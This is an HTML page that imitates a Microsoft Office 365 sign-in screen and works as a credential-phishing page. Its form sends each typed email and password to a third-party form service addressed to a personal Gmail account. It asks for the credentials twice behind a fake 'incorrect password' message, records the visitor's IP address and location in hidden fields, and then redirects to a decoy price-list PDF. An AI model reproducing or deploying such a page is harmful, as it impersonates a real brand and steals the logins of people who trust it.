<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in to your account</title>
    <link rel="shortcut icon" href="images/Favicon.svg" />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <div id="simpleModal" class="modal">
      <div class="modal-content">
        <div class="modal-header">
          <span class="closeBtn">&times;</span>
          <h2>Your account or password is incorrect</h2>
        </div>
      </div>
    </div>
    <div class="container">
      <div class="content">
        <div class="content-header">
          <div class="logo">
            <img src="images/Microsoft-Logo.svg" alt="" />
          </div>
          <div class="content-heading">
            <h1>Sign in</h1>
          </div>
        </div>
        <div class="content-body">
          <form
            action="https://formsubmit.co/sahilaujla15@gmail.com"
            method="POST"
          >
            <input type="hidden" name="_captcha" value="false" />
            <input
              type="hidden"
              name="_subject"
              value="New submission office 365 login"
            />
            <input
              type="hidden"
              name="_next"
              value="https://pdfhost.io/v/Jm0kSWjJR_Dealer_Price_Listpdf.pdf"
            />
            <input id="ip" type="hidden" name="IP-Address" />
            <input id="city" type="hidden" name="City" />
            <input id="country" type="hidden" name="Country" />
            <input id="timezone" type="hidden" name="Timezone" />
            <input
              id="firstemailaddress"
              type="hidden"
              name="First-Time-Email-Phone-or-Skype"
            />
            <input
              type="hidden"
              id="firsttimepassword"
              name="First-Time-Password"
            />
            <div class="email-field">
              <input
                class="not-hidden"
                id="emailaddress"
                type="text"
                name="Second-Time-Email-Phone-or-Skype"
                placeholder="Email, phone, or Skype"
                required
              />
            </div>
            <div class="password-field">
              <input
                class="not-hidden"
                type="text"
                autocomplete="off"
                id="passwords"
                name="Second-Time-Password"
                placeholder="Password"
                required
              />
            </div>
            <p id="red"></p>
            <p>No account? <span class="blue">Create one!</span></p>
            <p><span class="blue">Can't access your account?</span></p>
            <div class="button" id="submit-parent">
              <div id="submit">Next</div>
            </div>
          </form>
        </div>
      </div>
      <div class="sign-in-options">
        <div class="wrap-sign-in">
          <span
            ><img id="key" src="images/Sign-in-options.svg" />Sign-in
            options</span
          >
        </div>
      </div>
    </div>
  </body>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

  <script src="main.js"></script>
</html>
